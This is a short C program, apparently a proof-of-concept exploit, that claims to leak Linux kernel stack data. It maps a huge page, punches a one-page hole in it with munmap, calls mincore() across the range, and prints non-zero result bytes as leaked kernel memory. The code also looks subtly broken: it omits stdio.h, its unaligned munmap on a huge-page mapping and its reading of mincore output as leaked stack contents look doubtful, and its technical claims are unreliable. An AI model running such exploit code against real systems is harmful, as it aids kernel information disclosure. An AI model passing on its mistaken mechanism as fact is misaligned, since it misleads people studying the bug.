#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>

#define HUGETLB_SIZE (2 * 1024 * 1024) // 2MB huge page size

int main(void) {
    // 1. Map a huge page.
    void *addr = mmap(NULL, HUGETLB_SIZE, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    printf("Huge page mapped at: %p\n", addr);

    // 2. Create a hole in the middle of the huge page mapping.
    // This is the key step to trigger the vulnerability.
    long page_size = sysconf(_SC_PAGESIZE);
    if (munmap(addr + page_size, page_size) == -1) {
        perror("munmap");
        return 1;
    }
    printf("Created a %ld-byte hole in the mapping.\n", page_size);

    // 3. Allocate a vector for mincore() results.
    // The vector size must cover the entire huge page range.
    size_t vec_size = HUGETLB_SIZE / page_size;
    unsigned char *vec = malloc(vec_size);
    if (!vec) {
        perror("malloc");
        return 1;
    }
    memset(vec, 0, vec_size);

    // 4. Call mincore() on the entire range.
    // The kernel will leak stack data into the 'vec' entry corresponding to the hole.
    if (mincore(addr, HUGETLB_SIZE, vec) == -1) {
        perror("mincore");
        free(vec);
        return 1;
    }

    // 5. Print the leaked data.
    // A non-zero value in 'vec' at the hole's position indicates leaked information.
    printf("Leaked kernel data (non-zero bytes from mincore vec):\n");
    for (size_t i = 0; i < vec_size; ++i) {
        if (vec[i] != 0) {
            printf("vec[%zu] = 0x%02x\n", i, vec[i]);
        }
    }

    free(vec);
    munmap(addr, HUGETLB_SIZE);
    return 0;
}
